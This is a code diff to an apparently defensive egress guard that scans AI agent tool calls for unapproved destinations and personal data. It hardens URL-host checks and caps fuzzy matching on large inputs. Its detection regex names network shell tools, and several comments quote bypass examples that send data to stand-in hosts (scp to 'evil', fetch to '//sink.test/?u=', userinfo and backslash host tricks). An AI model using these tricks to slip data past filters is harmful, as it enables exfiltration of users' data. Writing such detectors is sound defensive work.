@@ -11,7 +11,7 @@ import re
 import unicodedata
 from dataclasses import dataclass, field, replace
 from pathlib import Path
-from urllib.parse import unquote_plus, urlsplit
+from urllib.parse import unquote, unquote_plus, urlsplit
 
 from egress_guard.fuzzy import clean, contact_hits, fuzzy_hits
 
@@ -92,6 +92,8 @@ def _file_text(tool_input) -> str:
 
 def fold(s: str) -> str:
     """Lower case, no diacritics (also the letters NFKD does not split, e.g. Polish ł)."""
+    if s.isascii():  # nothing to fold; skips a per-character pass over large inputs
+        return s.lower()
     s = unicodedata.normalize("NFKD", s.translate(_FOLD))
     return "".join(c for c in s if not unicodedata.combining(c)).lower()
 
@@ -211,6 +213,8 @@ class Finding:
 
 def _unaccent(s: str) -> str:
     """fold() without lower-casing, so capitalisation survives at the same positions."""
+    if s.isascii():
+        return s
     s = unicodedata.normalize("NFKD", s.translate(_FOLD))
     return "".join(c for c in s if not unicodedata.combining(c))
 
@@ -288,19 +292,35 @@ _NON_HTTP = re.compile(r"\b(?:scp|sftp|ssh|rsync|nc|ncat|socat|telnet|ftp|sendma
 SHELL_TOOLS = ("Bash", "PowerShell", "exec_command", "shell")
 
 
+_PROTO_REL = re.compile(r"(?<![\w:/])//([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?=[/:?#\s'\"]|$)")
+# inputs above this size get exact checks only: fuzzy matching over every decoded view of megabytes of text
+# outran the hook timeout (8 MB: 13 s; Sol review r2, 2026-11-01). Tool calls this large are rare.
+FUZZY_MAX = 256_000
+
+
 def host_allowed(text: str, allow_hosts: list[str]) -> bool:
     if _NON_HTTP.search(text):
         return False  # `scp f user@evil:/tmp # https://github.com`: the real target is not the URL
     hosts = []
-    for url in re.findall(r"https?://[^\s'\"<>]+", text, re.IGNORECASE):
-        try:
-            parts = urlsplit(url)
-            host = parts.hostname
-        except ValueError:
-            return False
-        if not host or "@" in parts.netloc or "\\" in url:
-            return False  # `https://trusted.test:pw@sink.test/`: userinfo hides the real host (final review, 2026-10-31)
-        hosts.append(host.rstrip("."))
+    # every destination counts: URLs in the raw and URL-decoded text (`?next=https%3A%2F%2Fsink.test`), and
+    # protocol-relative `//sink.test/` (fetch('//sink.test/?u=...') next to an allowed url; Sol review r2, 2026-11-01)
+    for t in dict.fromkeys((text, unquote(text), unquote(unquote(text)))):
+        # overlapping: `https://ok.org/?next=https://sink.test` holds two destinations
+        for url in re.findall(r"(?=(https?://[^\s'\"<>]+))", t, re.IGNORECASE):
+            authority = re.split(r"[/?#]", url.split("://", 1)[1], maxsplit=1)[0]
+            try:
+                parts = urlsplit(url)
+                host = parts.hostname
+            except ValueError:
+                return False
+            # `https://trusted.test:pw@sink.test/`: userinfo hides the real host (final review, 2026-10-31);
+            # a backslash in the host part (`https://sink.test\.trusted.test`) is a path separator to browsers.
+            # A backslash later in the URL (a `\n` in code after it) is not (false block, 2026-11-01).
+            if not host or "@" in authority or "\\" in authority:
+                return False
+            hosts.append(host.rstrip("."))
+        for host in _PROTO_REL.findall(t):
+            hosts.append(host.lower().rstrip("."))
     return bool(hosts) and all(any(h == a or h.endswith("." + a) for a in allow_hosts) for h in hosts)
 
 
@@ -390,11 +410,11 @@ def scan_tool_call(tool_name: str, tool_input, ident: Identity, strict: bool = F
         return out
     for t in texts:
         extra = []
-        if ident.fuzzy != "off":
+        if ident.fuzzy != "off" and len(t) <= FUZZY_MAX:
             for v in dict.fromkeys(views(cut.sub(" ", t) if cut else t)):  # also URL-decoded, base64, "at"/"dot"
                 extra += fuzzy_hits(v, ident.emails, ident.names, ident.first_alone, ident.extra,
                                     ident.derived_names)
-        if ident.contact_fields != "off":
+        if ident.contact_fields != "off" and len(t) <= FUZZY_MAX:
             extra += contact_hits(t, ident.allow_emails)
         for kind, what in extra:
             if (kind, what) not in seen:
